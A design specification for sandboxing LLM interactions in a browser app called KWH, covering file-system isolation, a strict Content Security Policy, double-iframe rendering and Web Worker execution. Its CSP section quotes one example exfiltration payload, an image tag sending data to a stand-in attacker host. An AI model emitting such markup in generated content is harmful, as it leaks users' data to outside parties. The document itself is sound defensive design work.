# Browser Sandboxing Specification for KWH

**Source Reference**: [The Browser is the Sandbox](https://aifoc.us/the-browser-is-the-sandbox/)

## 1. Overview
This specification outlines the architecture for implementing a secure, browser-based sandbox for AI interactions within the KWH application. The goal is to allow the application to perform complex knowledge work tasks using Large Language Models (LLMs) while strictly isolating file system access, network requests, and code execution to protect user data and privacy.

## 2. Security Pillars

### 2.1 File System Sandbox
We will utilize the **File System Access API** to create a secure boundary around user data.

*   **User Action**: The user must explicitly grant access to a specific folder via `window.showDirectoryPicker()`.
*   **Isolation**: The application operates effectively within a "chroot" environment rooted at the selected directory. Providing access to a folder does not grant access to parent directories or siblings.
*   **Layers of Access**:
    *   *Read-Only*: Parsing files for context.
    *   *Read-Write*: Saving generated content or modifying existing files (requires explicit permission).
*   **Origin Private File System (OPFS)**: Use OPFS for temporary storage or intermediate files that do not need to persist in the user's visible file system.

### 2.2 Network Sandbox (CSP)
We will enforce a strict **Content Security Policy (CSP)** to prevent data exfiltration.

*   **Policy**: `default-src 'none'`
*   ** exceptions**:
    *   `connect-src 'self' https://api.anthropic.com https://api.openai.com` (and other trusted AI providers).
    *   `script-src 'self'` (No inline scripts, no external scripts other than the detailed bundle).
    *   `style-src 'self' 'unsafe-inline'` (Allow inline styles for UI dynamism, but monitor closely).
    *   `img-src 'self' blob: data:` (Strictly limit where images can load from).
*   **Goal**: Ensure that even if the LLM hallucinates or maliciously generates a URL (e.g., `<img src="https://evil.com/steal?data=...">`), the browser blocks the request.

### 2.3 Rendering Sandbox (Double Iframe Pattern)
To safely display content generated by the LLM (which may contain HTML/JS), we will use the **Double Iframe** technique.

*   **Outer Iframe**:
    *   Acts as a firewall.
    *   `srcdoc` includes a metadata tag: `<meta http-equiv='Content-Security-Policy' content="default-src 'none'; script-src 'none';">`.
    *   `sandbox="allow-scripts"` (Allows the outer generic logic, if any, but restricts the network).
*   **Inner Iframe**:
    *   Nested within the Outer Iframe.
    *   Contains the actual LLM-generated HTML.
    *   `sandbox=""` (Fully locked down: no scripts, no forms, no same-origin).
    *   If scripts are strictly needed for the content: `sandbox="allow-scripts"` but keeping the network locked at the Outer layer ensures no exfiltration.

### 2.4 Execution Sandbox (Web Workers & WASM)
For executing code or tools (e.g., data processing, linting, running generated code):

*   **Web Workers**: All tool execution occurs in a dedicated Web Worker.
    *   Workers run off the main thread.
    *   Workers have no DOM access.
    *   Workers inherit strict CSP headers.
*   **WebAssembly (WASM)**:
    *   Use WASM binaries for complex tools (e.g., `sqlite`, `ffmpeg`, `grep`) to run safely client-side.
    *   Provides memory safety and isolation from the host environment.

## 3. Implementation Plan

### Phase 1: Foundation
1.  **Update `index.html`**: implementing the strict meta CSP tag.
2.  **File System Service**: Create a service to handle `showDirectoryPicker`, read/write operations, and handle permissions.

### Phase 2: The Sandbox Component
1.  **`SafeRenderer` Component**: A React/Web Component implementing the Double Iframe strategy.
    *   Props: `content` (HTML string).
    *   Logic: Dynamically constructs the nested iframe `srcdoc` structures.

### Phase 3: Tooling
1.  **Worker Manager**: A system to spawn/terminate Web Workers for tasks.
2.  **WASM Integration**: Integrate a test WASM tool (e.g., a markdown parser or simple grep) running inside the Worker.

## 4. Risks & Mitigations
*   **Risk**: LLM convinces user to copy-paste malicious commands.
    *   *Mitigation*: UI warnings when copying content from the SafeRenderer.
*   **Risk**: Browser vulnerabilities in File System API.
    *   *Mitigation*: Keep dependencies updated; rely on browser vendor security patches; maintain "User Verification" steps for sensitive writes.
